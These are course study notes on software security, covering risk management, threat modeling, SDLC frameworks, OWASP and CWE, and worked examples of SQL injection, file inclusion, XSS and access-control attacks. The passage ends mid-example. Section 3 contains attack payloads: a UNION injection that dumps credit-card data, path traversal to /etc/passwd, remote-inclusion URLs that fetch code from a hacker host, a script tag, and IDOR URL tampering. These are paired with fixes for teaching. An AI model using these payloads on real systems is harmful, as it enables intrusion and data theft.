# 🛡️ SOFTWARE SECURITY — MASTER STUDY NOTES
### Subject: CCSB5133 | Dr. Khairunnisa bt Osman | Sem 2 (2025/2026)
### Source: Chapters 1–8 PPTX + Demo PDFs (LFI, RFI, XSS)

---

## 📖 ABBREVIATION KEY

| Short Form | Full Meaning |
|------------|--------------|
| vuln | Vulnerability |
| auth | Authentication / Authorization |
| sec | Security |
| app | Application |
| dev | Developer / Development |
| DB | Database |
| SQLi | SQL Injection |
| LFI | Local File Inclusion |
| RFI | Remote File Inclusion |
| XSS | Cross-Site Scripting |
| BAC | Broken Access Control |
| BO | Buffer Overflow |
| SDLC | Software Development Life Cycle |
| S-SDLC | Secure SDLC |
| RMF | Risk Management Framework |
| OWASP | Open Worldwide Application Security Project |
| SAMM | Software Assurance Maturity Model |
| ASC | Application Security Control |
| ASCL | Application Security Control Library |
| ASLC | Application Security Life Cycle |
| ASMP | Application Security Management Process |
| ONF | Organizational Normative Framework |
| CWE | Common Weakness Enumeration |
| IDOR | Insecure Direct Object Reference |
| BOLA | Broken Object Level Authorization |
| MFLAC | Missing Function Level Access Control |
| BFLA | Broken Function Level Authorization |
| MFA | Multi-Factor Authentication |
| SAST | Static Application Security Testing |
| DAST | Dynamic Application Security Testing |
| DoS | Denial of Service |
| ASLR | Address Space Layout Randomization |
| DEP | Data Execution Prevention |
| ACL | Access Control List |
| SSRF | Server-Side Request Forgery |
| STRIDE | Spoofing, Tampering, Repudiation, Info Disclosure, DoS, Elevation of Privilege |
| DREAD | Damage, Reproducibility, Exploitability, Affected Users, Discoverability |
| SDL | Security Development Lifecycle (Microsoft) |
| RUP | Rational Unified Process |
| DevSecOps | Development + Security + Operations (integrated pipeline) |
| TLS | Transport Layer Security |
| SSRF | Server-Side Request Forgery |
| w/ | with |
| w/o | without |
| b/w | between |
| e.g. | for example |

---

---

# SECTION 1: CORE CONCEPTS
## 1.1 — What Is Software Security?

> **Simple definition:** Making sure your software keeps working correctly even when a bad person is trying to break it.

- Sec is about **engineering software** so it still works correctly **under attack**.
- Sec aims to **avoid vulns by addressing them early** — not after the software is built.
- **"Security is a risk management."** — Ch.1, Slide 4
- Most software today is **insecure** because of:
  - Lack of education in secure methods
  - Poor design thinking
  - Lack of testing
  - Bad dev environments

---

## 1.2 — Key Terminology (The Building Blocks)

These 5 words are the foundation of all sec conversations:

| Term | What it Means (Simple) | Example from Slides |
|------|------------------------|---------------------|
| **Defect** | The software doesn't match what was asked for | Asked for min 8-char password, app allows 5 |
| **Bug** | A coding mistake that makes the software crash or misbehave | App crashes when you click "Login" |
| **Flaw** | A weakness in the *design* or *logic* — harder to see than a bug | Storing passwords in plain text instead of encrypted |
| **Failure** | When software can't do its job at all | App goes down completely |
| **Vulnerability (Vuln)** | A weakness that an attacker can actually use to cause harm | Either from a bad design OR bad code |

> **Risk Formula:** `Risk = Probability (of attack) × Impact (of damage)`

- **Design-level vulns are the hardest to fix** — you can't see them just by reading code. Need a higher-level view.

---

## 1.3 — CIA Triad

The CIA Triad is the **3 core goals of any secure system**:

| Letter | Goal | What It Means (Simple) |
|--------|------|------------------------|
| **C** | Confidentiality | Only the right people can *see* data |
| **I** | Integrity | Data cannot be secretly *changed or tampered with* |
| **A** | Availability | The system/data is *always accessible* when needed |

The slides use **CI4AM** (an expanded version) for Threat Modeling:

| Letter | Meaning |
|--------|---------|
| C | Confidentiality |
| I | Integrity |
| A | Availability |
| A | Authentication (Who are you?) |
| A | Authorization (What are you allowed to do?) |
| A | Auditing (Is there a log of what was done?) |
| M | Management (Is the whole system being governed?) |

> ℹ️ Secure Code's **goal** is directly stated as: "Ensures **confidentiality, integrity, and availability** of data." — Ch.1, Slide 45

---

## 1.4 — Three Pillars of Software Security

The course defines **3 main pillars** that hold up software security:

```
┌──────────────────────────────────────────────┐
│         THREE PILLARS OF SOFTWARE SEC        │
├──────────────┬──────────────┬────────────────┤
│  PILLAR I    │  PILLAR II   │  PILLAR III    │
│ Risk Mgmt    │  Touchpoints │  Knowledge     │
└──────────────┴──────────────┴────────────────┘
```

### 🏛️ PILLAR I — Risk Management (RMF)

Risk management is **the most central practice** in software sec. It's NOT a one-time thing — it must be **repeated continuously** throughout the project.

**The 5 RMF Activities:**

**Step 1 — Understand Business Context**
- Find out what the business goals are.
- Rank what's critical (which assets, which operations matter most).
- Gather project artifacts and research the scope.

**Step 2 — Identify Business & Technical Risks**
- Find threats and vulns.
- Analyze how *likely* an attack is.
- Map technical risks to business goals.
- Interview the project team. Use questionnaires.

**Step 3 — Rank & Prioritize Risks**
- Use metrics: Likelihood + Impact + How many risks are growing over time.
- Answer: "What do we fix FIRST?"

**Step 4 — Define Risk Mitigation Strategy**
- Build a plan that considers: Cost, Time to implement, Likelihood of success, Competence, Impact.
- Use Cost-Benefit Analysis to make decisions.

**Step 5 — Fix & Validate**
- Actually implement the plan.
- Use validation techniques to confirm the risk is gone.
- Track progress against the mitigation strategy.

> ⚠️ **Key Rule:** "Identifying risks only ONCE during the project IS INCORRECT. Risk assessments must be applied **repeatedly**." — Ch.1, Slide 18
> Use project management tools (e.g., Open Workbench) to track risks.

---

### 🏛️ PILLAR II — Touchpoints (The 7 Security Practices)

Touchpoints are **specific sec activities** applied at different stages of building software.

#### Touchpoint 1 — Abuse Cases
- Define what the software **cannot and will not do**.
  - Example: "Users can't enter more than 50 characters."
- **Anticipate bad behavior.** Never say "No one would do this."
- **Generating Abuse Cases involves:**
  - *Anti-Requirements:* Insights into how attackers will try to break assumptions.
  - *Attack Model:* Look at known attack patterns, build abuse cases around them, include anyone who can access the system.

#### Touchpoint 2 — Security Requirements
- Must cover both **functional sec** (what the system does for sec) and **emergent characteristics** (how it behaves under attack).
- Must meet 3 criteria:
  1. **Definition** — What are the security requirements, exactly?
  2. **Assumption** — What do we assume will work as expected?
  3. **Satisfaction** — Do the requirements actually meet the sec goals?

#### Touchpoint 3 — Architectural Risk Analysis *(PRIORITY TOPIC — see Section 1.5)*

#### Touchpoint 4 — Risk-Based Security Testing
- Test from **inside-out** (not outside-in like normal pen testing).
- Must start **before the software is complete**.
- Two types:
  - *Functional sec testing:* Does the security mechanism actually work?
  - *Adversarial sec testing:* Think like an attacker — where would YOU attack?

#### Touchpoint 5 — Code Review
- **Source code analysis** focused on finding and fixing bugs.
- Use **static analysis tools** (e.g., Coverity, Fortify, Ounce Labs, Secure Software).
- Tools suffer from:
  - **False Positives** — flags code as bad when it's fine.
  - **False Negatives** — misses actual vulns.
- A good tool must:
  1. Be designed for security specifically
  2. Support multiple tiers (front-end, back-end, etc.)
  3. Be extensible (can add new rules)
  4. Be useful for both analysts AND devs
  5. Support existing dev processes
  6. Make sense to multiple stakeholders

#### Touchpoint 6 — Software Penetration Testing
- Simulates an attack from **outside-in** on the *final, complete* system.
- Most commonly applied touchpoint.
- Uses both static AND dynamic pen testing tools.
  - Tools: fault injection tools, Cenzic, Holodeck, SPI Dynamics, Immunity CANVAS, IEInspector HTTP Analyzer.

#### Touchpoint 7 — Security Operations
- Integrate software sec w/ network sec operations.
- **Defensive technique:** understand how software behaviour leads to successful attacks.
- Knowledge from attacks must be **cycled back** into software dev.

---

### 🏛️ PILLAR III — Knowledge

- Involves **gathering, encapsulating, and sharing** sec knowledge.
- **Software Security Knowledge Catalogs include:**
  - Principles, Guidelines, Rules
  - Vulnerabilities, Exploits
  - Attack Patterns
  - Historical Risks

---

## 1.5 — Architectural Risk Analysis (DEEP FOCUS)

> **Why this matters:** Design-level flaws account for **50% of all security problems** and **cannot be found just by reading code.**

Architectural Risk Analysis is a touchpoint that:
- Tracks risk over time.
- Links system-level concerns to probability and impact.
- Works together with RMF.

**Three Critical Aspects:**

### A) Attack Resistance Analysis
*Think of this as a "checklist approach"*
- Uses Microsoft Threat Modeling approach as a reference.
- **Steps:**
  1. Identify general flaws using secure design literature and checklists.
  2. Map attack patterns (from abuse cases or historical risk lists).
  3. Identify risks in the architecture using checklists.
  4. Demonstrate that known attacks are actually viable (prove they work).

### B) Ambiguity Analysis
*This is the creative part — finding new risks no checklist covers*
- Requires **at least 2 analysts** working together.
- Requires experience (you need to know what "weird" looks like).

### C) Weakness Analysis
*Focuses on third-party and external software you depend on*
- Understands the **impact of software dependencies**.
- Software is built on top of **complex middleware frameworks** — what happens when those break?
- Forces the question: "What happens when our assumptions about outside software **fail**?"

---

## 1.6 — Quality vs. Secure Code

These two things are **related but NOT the same.** You need BOTH.

| | Quality Code | Secure Code |
|--|-------------|-------------|
| **Focus** | Functionality, performance, usability, maintainability | Protection against threats, vulns, and attacks |
| **Goal** | Meets user requirements and performs tasks efficiently | Ensures C, I, A of data |
| **Examples** | Fewer bugs, well-documented, fast, reliable | Proper input validation, safe auth & access control, resilience against SQLi, BO |

**The Key Insight (from Ch.1, Slide 47):**
- **High quality ≠ Secure** → A bug-free app can still be hacked.
- **Secure ≠ High quality** → A secure app can still crash or be slow.
- **Best Practice = Balance both → Quality + Security = Reliable Software**

---

## 1.7 — Threat Modeling

> **Simple definition:** A structured way to find "where could this be attacked?" before you build it.

- Helps make **design and engineering decisions** and tells you where to focus sec efforts.
- The process is **iterative (continuous)** — not a one-time thing.

**Threat Modeling Process (5 Steps):**

1. **Identify Security Objectives** — Using CI4AM. Use policies, legal/compliance requirements. Examples: Prevent Data Theft, Protect IP, Attain Compliance, Provide high availability.

2. **Application Overview** — Where deployed? Who are the users? What data elements? What rights do users have? What tech stack? What sec mechanisms apply (CI4AM)?

3. **Decompose the Application** — Break it into pieces:
   - *Entry Points:* Ports, pages, APIs, stored procedures (where attackers get in).
   - *Exit Points:* Pages that display data (where data leaks out).
   - *Trust Boundaries:* Where trust level changes (e.g., Firewall, Web server → DB).
   - *Data Flows:* Should we validate data at each node?

4. **Identify Threats (STRIDE)** — Two approaches:
   - Use Attack Trees (CI4AM)
   - Think like an attacker (STRIDE/DREAD, OCTAVE)
   - *Threat list examples:* SQLi, XSS, Replay Attacks, MITM, Eavesdropping.

   #### STRIDE Threat Model (Ch.1, Slide 55):
   > **Simple:** STRIDE is a 6-category checklist for thinking like an attacker — one letter for each type of threat.

   | Letter | Threat Type | What It Means | Example |
   |--------|------------|--------------|---------|
   | **S** | **Spoofing** | Pretending to be someone/something else | Fake login page, forged email |
   | **T** | **Tampering** | Secretly modifying data | Changing a price in a URL parameter |
   | **R** | **Repudiation** | Denying you did something (no audit trail) | User denies placing an order, no log to prove it |
   | **I** | **Information Disclosure** | Exposing data to those who shouldn't see it | Leaking credit card numbers |
   | **D** | **Denial of Service** | Making the system unavailable | Flooding a server w/ requests |
   | **E** | **Elevation of Privilege** | Gaining more permissions than allowed | Regular user accessing admin functions |

5. **Identify Vulnerabilities** — Based on the threats found. Typical vulns: Weak Encryption, Clear Text Credentials, Unhandled Exception, Dynamic SQL, Long Session Timeouts.

**Ranking Threats:**
- Risk can be: Accepted, Mitigated, Transferred, or Ignored *(Avoid ignoring!).*
- Two ranking methods: Probability × Impact, or DREAD Average Ranking.

#### DREAD Average Ranking (Ch.1, Slide 57–58):
> **Simple:** DREAD is a scoring system. Rate each threat on 5 factors (1–10 each), average the scores, highest score = highest priority to fix.

| Letter | Factor | Question to Ask |
|--------|--------|----------------|
| **D** | **Damage Potential** | How bad is the damage if exploited? (10 = destroys everything) |
| **R** | **Reproducibility** | How easy is it to reproduce the attack? (10 = always works) |
| **E** | **Exploitability** | How much skill/effort does the attack need? (10 = anyone can do it) |
| **A** | **Affected Users** | How many users are impacted? (10 = everyone) |
| **D** | **Discoverability** | How easy is it to find this vulnerability? (10 = trivially obvious) |

**Formula:** `DREAD Score = (D + R + E + A + D) ÷ 5`
- Score 8–10 → **Critical** — fix immediately
- Score 5–7 → **High/Medium** — fix soon
- Score 1–4 → **Low** — monitor, fix later

---

---

# SECTION 2: SDLC & FRAMEWORKS

## 2.1 — Standard SDLC Phases

The normal (non-secure) SDLC has 6 phases:

| Phase | What Happens |
|-------|-------------|
| Planning | Identify project goals, requirements, feasibility |
| Design | Create architecture and design specs |
| Implementation | Write and compile code |
| Testing | Validate software against requirements, find defects |
| Deployment | Release software to users |
| Maintenance | Ongoing support and updates |

---

## 2.2 — Secure SDLC (S-SDLC): Security in Every Phase

The S-SDLC **integrates security into each phase** — it's not added at the end:

### Phase 1: Planning & Requirements
- **Risk Assessment:** Identify potential threats and vulns early.
- **Abuse Cases:** How might attackers approach the system?
- **Security Requirements:** Define both functional sec and non-functional sec requirements immediately.

### Phase 2: Design
- **Threat Modeling:** Identify potential risks in the design.
- **Secure Design Principles:** Apply principles like **Least Privilege** (give users the minimum access they need) and **Defense in Depth** (multiple layers of protection).

### Phase 3: Implementation (Coding)
- **Secure Coding Practices:** Train devs to avoid common vulns (SQLi, XSS).
- **Code Reviews:** Regular reviews focused specifically on security.

### Phase 4: Testing
- **Security Testing:** Static analysis, dynamic analysis, pen testing, vuln scanning.
- **Risk-Based Security Testing:** Inside-out approach, grounded in the attacker's mindset.
- **Automated Tools:** Use tools to find vulns faster.

### Phase 5: Deployment
- **Configuration Management:** Make sure secure configurations are in place *before* going live.
- **Access Controls:** Implement strict role-based access to limit who sees sensitive data.

### Phase 6: Maintenance
- **Regular Updates:** Keep software and dependencies updated against known vulns.
- **Incident Response Plan:** Have a plan ready for when a breach happens.

---

## 2.3 — OWASP SAMM (Software Assurance Maturity Model)

> **Simple definition:** A framework that shows you "how mature is your security?" and gives you a roadmap to improve it.

- Open-source framework from **OWASP**.
- Helps organizations: Evaluate current sec practices, Build a roadmap for improvement, Measure progress over time.

### SAMM Structure: 5 Business Functions × 2 Practices each

| Business Function | Practice 1 | Practice 2 |
|-------------------|-----------|-----------|
| (1) Governance | Strategy & Metrics | Policy & Compliance |
| (2) Design | Threat Assessment | Security Requirements |
| (3) Implementation | Secure Build | Secure Deployment |
| (4) Verification | Security Testing | Security Review |
| (5) Operations | Incident Management | Environment Management |

### Maturity Levels (VERY IMPORTANT)

| Level | What It Means | Think of It As... |
|-------|--------------|------------------|
| **Level 1** | Ad-hoc / basic activities | "We do some security stuff sometimes" |
| **Level 2** | Defined, repeatable, organization-wide | "We have a real plan and follow it consistently" |
| **Level 3** | Optimized, measured, continuous improvement | "We measure everything and keep getting better" |

### Real Example of Using SAMM (from Ch.2, Slide 7):
1. **Assess** → Strong compliance policies (Governance: Level 2) but weak secure coding (Implementation: Level 1).
2. **Set Target** → Business wants Level 2 in ALL areas within 2 years.
3. **Improvement Plan:**
   - Governance: Formal AppSec steering committee.
   - Design: Threat modeling workshops for high-risk apps.
   - Implementation: Train devs on OWASP Top 10, introduce SAST/DAST tools.
   - Verification: Regular pen tests + CI/CD security checks.
   - Operations: Incident response playbooks + security monitoring dashboards.

---

## 2.4 — ISO/IEC 27034: Application Security Standard

> A standard that defines *HOW* to manage app security throughout the full software lifecycle. It does NOT give you a ready-made list of controls — it gives you the *framework* to manage them.

**5 Key Concepts from ISO 27034:**

| Term | Simple Explanation | Example |
|------|--------------------|---------|
| **ASC** (App Security Control) | One specific security function | Use HTTPS, encrypt credit card numbers |
| **ASCL** (Control Library) | A reusable catalog of ASCs | Company library has "payment encryption control," "session timeout control" |
| **ASLC** (App Security Life Cycle) | Security built into every SDLC stage | Secure design → development → testing → deployment → maintenance |
| **ASMP** (Management Process) | Governance structure ensuring sec is ongoing | Managers monitor that devs follow the controls |
| **ONF** (Org Normative Framework) | Company-wide policies, standards, guidelines for sec | "All payment apps must comply with PCI DSS" |

**ISO 27034 Parts:**
- **Part 1 (2011):** Overview & Concepts — Introduces ASC, ASCL, ASLC, ASMP, ONF.
- **Part 2:** ONF framework — Policies, standards, procedures for app sec.
- **Part 3 (2018):** ASMP — Practical guidance on managing app sec.
- **Part 4:** Application Security Validation (ASV) *(under dev)* — How to validate that an app meets sec requirements.
- **Part 5:** Protocol Bindings *(planned)* — Guidance on implementing app sec in specific technical protocols.
- **Part 6:** Case Studies *(planned)* — Real-world examples of applying ISO/IEC 27034.
- **Part 7 (2018):** Assurance Prediction Framework — How to predict and measure sec controls.

**What ISO 27034 does NOT provide:** Ready-made security controls. For actual controls, use:
- ISO/IEC 27001 → General info sec controls
- OWASP ASVS → Web & mobile app sec requirements
- PCI DSS → Payment card data protection
- NIST SP 800-53 → Security & privacy control catalog
- CWE → Known software weakness patterns

---

## 2.5 — OWASP Top 10 Application Security Risks

> The 10 most critical web app sec risks, in order:

| # | Risk | Simple Explanation |
|---|------|-------------------|
| A01 | **Broken Access Control** | Users can do things they're not supposed to (see admin pages, other users' data). Failures lead to unauthorized info disclosure, modification, or destruction of data |
| A02 | **Cryptography Failures** | Weak or missing encryption exposes sensitive data like passwords/credit cards. First step: determine what data needs protection in transit AND at rest |
| A03 | **Injection** | Attacker puts malicious code (SQL, XSS) into input fields, tricking the app to run it. **Source code review** is the best detection method; also test all params, headers, URLs, cookies, JSON |
| A04 | **Insecure Design** | The app was designed wrong from the start — no threat modeling, insecure workflows. Fix: integrate threat modeling into design reviews and look for changes in data flows/access controls |
| A05 | **Security Misconfiguration** | Default passwords left on, open cloud storage, unnecessary features left enabled |
| A06 | **Vulnerable & Outdated Components** | Old libraries with known bugs that attackers can exploit |
| A07 | **Identification & Auth Failures** | Weak login systems, no MFA, broken password resets, session problems. Confirmation of user identity + session management is critical |
| A08 | **Software & Data Integrity Failures** | Installing updates from untrusted sources, supply chain attacks; code/infra that does not protect against integrity violations |
| A09 | **Security Logging & Monitoring Failures** | Not detecting attacks because logs are missing, weak, or ignored. **Without logging and monitoring, breaches cannot be detected** |
| A10 | **Server-Side Request Forgery (SSRF)** | Attacker tricks the SERVER into making requests to internal/protected systems. Occurs when a web app fetches a remote resource w/o validating the user-supplied URL — can bypass firewalls and VPNs |

---

## 2.6 — CWE (Common Weakness Enumeration)

> A **catalog of specific coding mistakes** — published by MITRE. Each weakness gets a unique ID number.

**Why CWE matters:**
- Devs: Know what coding errors to avoid.
- Testers: Check if software has these known flaws.
- Organizations: Set coding standards and measure sec maturity.

**Key CWE Entries from Ch.2:**

| CWE ID | Name | Simple Explanation |
|--------|------|--------------------|
| CWE-20 | Improper Input Validation | Input not properly checked — allows dangerous data in |
| CWE-74 | Injection | Malicious code/commands executed through unchecked input |
| CWE-120 | Buffer Overflow | Data copied without checking size limits → memory corruption |
| CWE-119 | Memory Bound Error | Operations outside allocated memory → crashes or exploits |
| CWE-384 | Session Fixation | Attacker's session ID reused, allowing session hijack |
| CWE-287 | Improper Authentication | User identity not verified correctly → unauthorized access |
| CWE-316 | Cleartext Storage in Memory | Sensitive info stored unencrypted in memory → easy theft |
| CWE-117 | Improper Logging | Unsafe/unchecked data in logs → tampering or info leaks |
| CWE-223 | Missing Security Info | System omits important sec-related details in logs → attacks harder to detect |
| CWE-209 | Info Exposure in Error Message | Error messages reveal too much technical detail to attackers |
| CWE-200 | Information Exposure | Sensitive data shown to users who should not see it |

**OWASP vs. CWE — Key Difference:**

| Aspect | OWASP Top 10 | CWE |
|--------|-------------|-----|
| Focus | Attacker's view — risks | Developer's view — coding flaws |
| Level | High-level categories | Low-level, detailed issues |
| Example | A01: Broken Access Control | CWE-285: Improper Authorization |
| Relationship | Each OWASP category maps to many CWE entries | Each CWE may belong to one or more OWASP categories |

---

## 2.7 — Software Development Methodologies & Security (Ch.2, Slides 31–35)

> **Why this matters:** The *type* of dev process you use determines HOW and WHEN security gets integrated.

### Traditional Methodologies

| Model | Security Characteristic | Weakness |
|-------|------------------------|---------|
| **Waterfall** | Security added **late** (reactive) — only checked during testing phase | Flaws found late are expensive to fix; no iteration |
| **V-Model** | Maps security testing to each development stage | Limited flexibility — still mostly sequential |

### Iterative & Incremental Models

| Model | Security Characteristic | Strength |
|-------|------------------------|---------|
| **Spiral** | Risk-driven, iterative — **security considered early** (threat/risk analysis in every loop) | Catches design flaws before they compound |
| **RUP** (Rational Unified Process) | Iterative, architecture-centric — security addressed in requirements & design phases | Security is part of the architecture decisions |

### Agile Methodologies

| Model | Security Characteristic | Risk |
|-------|------------------------|------|
| **Agile Development** | Prioritizes speed & adaptability — but **security is often skipped** in sprints | "We'll add security later" mentality leads to tech debt |
| **Secure Agile / DevSecOps** | Security embedded in **every sprint** — threat modeling, automated sec testing in CI/CD pipeline | Best of both: fast delivery + built-in sec |

### Security-Specific Methodologies

| Model | What It Does |
|-------|-------------|
| **Microsoft SDL** (Security Development Lifecycle) | Security built into ALL phases: threat modeling in design, secure coding standards, sec testing, incident response planning |
| **OWASP SAMM** | Framework to assess current sec maturity level and build improvement roadmap |

> **Key Takeaway (from Ch.2):** Traditional models bolt security on at the end. Modern secure approaches (DevSecOps, Secure Agile, Microsoft SDL) **shift security left** — meaning security is done earlier, continuously, and automatically throughout dev.

---

---

# SECTION 3: VULNERABILITIES & ATTACKS

## 3.1 — SQL Injection (SQLi)

### What Is SQLi?
> **Simple:** A hacker types special code into your app's input box, and your app accidentally runs it as a real database command.

- SQLi is an attack where **SQL code is inserted into input parameters** that are passed to a back-end SQL server for parsing and execution.
- When an attacker modifies an SQL statement, it executes **with the same rights as the app user** — often highly privileged.
- SQLi has existed since SQL databases were first connected to web apps.

### How Web Apps Work (Why SQLi Is Possible)
- Web apps are **database-driven**. They take user input, build a SQL query, and send it to the DB.
- If input is not checked, the attacker's text becomes **part of the SQL command**.

---

### Example 1 — Basic SQLi (from Ch.3, Slides 18–22)

**BAD Code (Python):**
```python
SELECT * FROM users WHERE name = ' " + user_input + " ' ;
```

**Normal use:** User types `John` → Query becomes:
```sql
SELECT * FROM users WHERE name = 'John';
```
→ Returns only John's row. ✅

**Attack:** Attacker types `John' OR '1'='1`  → Query becomes:
```sql
SELECT * FROM users WHERE name = 'John' OR '1'='1';
```
- `'1'='1'` is **always true** → Returns ALL rows in the table.
- Attacker sees ALL users w/o proper auth. ❌

**Fix 1 — Parameterized Query (Python):**
```python
cursor.execute("SELECT * FROM users WHERE name = ?", (user_input,))
```
- The `?` is a placeholder. DB treats user input as **text only**, never as code.

**Fix 2 — Prepared Statement (Python):**
```python
stmt = "SELECT * FROM students WHERE name = ?"
cursor.execute(stmt, ("John",))
# With user input:
name = input("Enter student name: ")
cursor.execute(stmt, (name,))
```
- The query *structure* is defined first. Input is added *separately* — never merged into the query as code.

---

### Example 2 — URL Parameter SQLi (from Ch.3, Slides 23–24)

**Normal URL:** `http://www.victim.com/products.php?val=100`

**BAD PHP Code:**
```php
$val = $_GET['val'];
"SELECT * FROM products WHERE id=$val";
```
- Normal: `SELECT * FROM products WHERE id=100;` ✅

**Attack URL:** `http://www.victim.com/products.php?val=100' OR '1'='1`
- Results: Attacker sees ALL product data, OR app crashes, OR error message leaks technical info. ❌

**Fix — Prepared Statement (PHP):**
```php
$stmt = $pdo->prepare("SELECT * FROM products WHERE id = ?");
$stmt->execute([$val]);
```

---

### Example 3 — UNION Attack to Steal Credit Card Data (Ch.3, Slides 25–27)

**Attack inputs:**
```
Username: (blank)
Password: 'UNION SELECT SUBSTRING((SELECT ',' + s.[CardNumber] + ';' + s.[Expiry] + ';' + s.[Name] FROM dbo.[CreditCardData] s FOR XML PATH('')),2,200000)--
```

- The `UNION` statement **combines two queries** into one result.
- The second query pulls ALL credit card data from the `CreditCardData` table.
- Result: Login success page **displays all credit card numbers, expiry dates, and names.**
- The `--` at the end **comments out the rest of the original query** so it doesn't break.

---

### SQLi Prevention Summary

| Method | How It Stops SQLi |
|--------|------------------|
| Parameterized Queries | Input treated as text, never as code |
| Prepared Statements | Query structure locked in first; input added separately |
| Hide DB Errors | Don't show raw error messages — they help attackers learn the DB structure |
| WAF (Web App Firewall) | Filters malicious requests before they reach the DB |
| Keep software updated | Patch PHP, Python, MySQL to fix known vuln |

---

## 3.2 — Local File Inclusion (LFI)

### What Is LFI?
> **Simple:** A hacker tricks your web app into showing them files on your server that are supposed to be private (like password files or admin configs).

- Occurs when a web app **allows a user to include a local file** by specifying a path in a request parameter.
- Attacker uses `..` (dot-dot) to **navigate up the folder structure** and reach files outside the app's root directory.

### Attack Example (from Ch.6, Slide 22 + Demo PDF):

**URL:**
```
http://example.com/getUserProfile.jsp?item=../../../../etc/passwd
```
- Each `../` goes one folder UP.
- `../../../../etc/passwd` eventually reaches the Linux password file.
- This vulnerability can allow reading **sensitive data** or executing **arbitrary code**.

**Another demo attack (LFI Demo PDF):**
```
http://localhost/vuln_demo/index.php?page=secret/admin_panel.php
```

**BAD CODE (PHP — Not Safe):**
```php
$page = $_GET['page'] ?? 'home.php';
include($page);
```
- `$_GET['page']` directly takes whatever the user types in the URL.
- `include($page)` literally includes that file into the page.
- Attacker types any file path → server includes it. ❌

**SAFE CODE (PHP — Whitelisting):**
```php
$allowed_pages = ['home', 'profile'];
$page = $_GET['page'] ?? 'home';
if (in_array($page, $allowed_pages)) {
    include($page . '.php');
} else {
    echo "<h2>Access Denied</h2>";
}
```
- **Whitelist:** Only specific, pre-approved page names are accepted.
- ANY input not on the whitelist → "Access Denied."
- The `.php` is added by the server — the user never controls the full file path. ✅

---

## 3.3 — Remote File Inclusion (RFI)

### What Is RFI?
> **Simple:** A hacker tricks your web app into loading and running a malicious file from the *hacker's own website* on the internet.

- Occurs when a web app **includes a file from a remote server** specified in a request parameter.
- The attacker hosts malicious code on their own server; the vulnerable app fetches and *runs* it.

### Attack Example (from Ch.6, Slide 24 + Demo PDF):

**Normal URL:**
```
http://localhost/rfi_lab/index.php?page=home.php
```

**Attack URL:**
```
http://example.com/index.php?file=http://hacker.com/malicious.txt
http://localhost/rfi_lab/index.php?page=http://localhost/attacker/evil.php
```
- App fetches the hacker's file and *executes* it as code on the server. ❌

**BAD CODE (PHP — Not Safe):**
```php
$page = $_GET['page'] ?? 'home.php';
include($page);
```

**SAFE CODE (PHP — Whitelisting):**
```php
$allowed_pages = ['home.php', 'about.php'];
if (isset($_GET['page']) && in_array($_GET['page'], $allowed_pages)) {
    include($_GET['page']);
} else {
    echo "Invalid page!";
}
```
- Only pages on the whitelist are ever loaded. External URLs are completely rejected. ✅

### LFI vs. RFI — Quick Difference:

| | LFI | RFI |
|--|-----|-----|
| Source of malicious file | **On the same server** | **On the hacker's remote server** |
| Risk | Read sensitive server files | Execute hacker's own code |
| Fix | Whitelist of allowed local pages | Whitelist of allowed local pages (blocks all URLs) |

---

## 3.4 — Cross-Site Scripting (XSS) — from Demo PDF

### What Is XSS?
> **Simple:** A hacker types a piece of JavaScript code into your input form, and your website runs that code inside other users' browsers.

### Attack Example (XSS Demo PDF):

**Attack URL/Input:**
```html
<script>alert("XSS Attack!")</script>
```
User types this into a name field.

**BAD CODE (PHP — Not Safe):**
```php
if(isset($_GET['name'])) {
    echo "Hello " . $_GET['name'];
}
```
- Directly prints whatever the user typed.
- Browser sees `<script>` tag and **executes it as code**. ❌

**SAFE CODE (PHP — Using htmlspecialchars):**
```php
echo "Hello " . htmlspecialchars($_GET['name']);
```

**What `htmlspecialchars()` does (SANITIZING):**

| User Typed | Converted To | Why Safe |
|-----------|-------------|---------|
| `<` | `&lt;` | Browser shows it as text, not as an HTML tag |
| `>` | `&gt;` | Browser shows it as text |
| `"` | `&quot;` | Browser shows it as text |

- **Browser sees it as text, NOT as executable code.** ✅
- This is the definition of **sanitizing** (cleaning the input before using it).

---

## 3.5 — Deserialization

> ⚠️ **Note from Source Material:** The course slides do not provide a dedicated section on Deserialization with technical depth. It appears under **OWASP A08 — Software & Data Integrity Failures** (Ch.2, Slide 25) as part of "code and infrastructure that does not protect against integrity violations" and supply chain attacks.
> [External Source: OWASP — Deserialization is when an attacker sends specially crafted data to an app that processes it and converts it back to an object — if the app doesn't check this data properly, the attacker can execute malicious code. It's like receiving a package that, when opened, triggers a trap.]

---

## 3.6 — Broken Access Control (BAC)

### What Is Access Control?
> **Simple:** Access control decides "who is allowed to do what" in an app. Broken Access Control means those rules have holes in them.

- **Auth** identifies the user and confirms they are who they say they are.
- **Session management** tracks that subsequent requests come from the same user.
- **Access control** decides whether the user is *allowed* to do what they're trying to do.

**Common Weaknesses Leading to BAC:**
- Lack of proper auth
- Weak passwords
- Insufficient authorization
- Lack of auditing

---

### Three Types of Access Control

#### A) Vertical Access Control
- Controls based on **role or level of authority** (hierarchy).
- Example: Admin users can reach admin functions; regular users cannot.
- **Attack:** A regular user navigates directly to an admin URL.
  - `https://target.com/admin`
  - `https://target.com/administrator`
  - `https://target.com/web_admin`
  - → This causes **vertical privilege escalation** (a regular user gets admin powers).

#### B) Horizontal Access Control
- Controls based on **attributes of users at the SAME level**.
- Example: User A and User B are both regular users. A cannot see B's data, and B cannot see A's data.
- **Attack (IDOR):** Attacker changes their own user ID in the URL to another user's ID.
  - Normal: `https://target.com/viewCart.php?userID=1234`
  - Attack: `https://target.com/viewCart.php?userID=5678`
  - If it works → attacker sees another user's shopping cart. ❌

#### C) Context-Dependent Access Control
- Controls based on **contextual factors**: time, location, device, network, or application state.
- Example: After payment is completed on an e-commerce site, the user's cart should be locked — they can't change items. This is a business logic enforcement.
- Breaking this = a **business logic error related to BAC**.

---

### Real-World BAC Scenarios (from Ch.6)

#### IDOR (Insecure Direct Object Reference)
- App gives direct access to objects (like DB records) based on user-supplied input without checking if the user is *allowed*.
- Attack path:
  ```
  Normal:  https://target.com/viewCart.php?userID=1234  (your cart)
  Attack:  https://target.com/viewCart.php?userID=5678  (someone else's cart)
  Further: https://target.com/deleteAccount.php?userID=5678  (delete someone's account!)
  ```

#### BOLA (Broken Object Level Authorization) = "IDOR in APIs"
- Same logic as IDOR but through **API endpoints**.
- APIs expose endpoints that handle object identifiers.
- Object-level auth checks must be done in EVERY function that accesses a data source using user input.
- Attack: Tamper with User ID in GET request to API → expose other users' sensitive data.

#### MFLAC (Missing Function Level Access Control)
- App verifies access for some functions but not all.
- A function exists on the backend but is **not shown in the front-end UI** — attacker finds it anyway.
- Example:
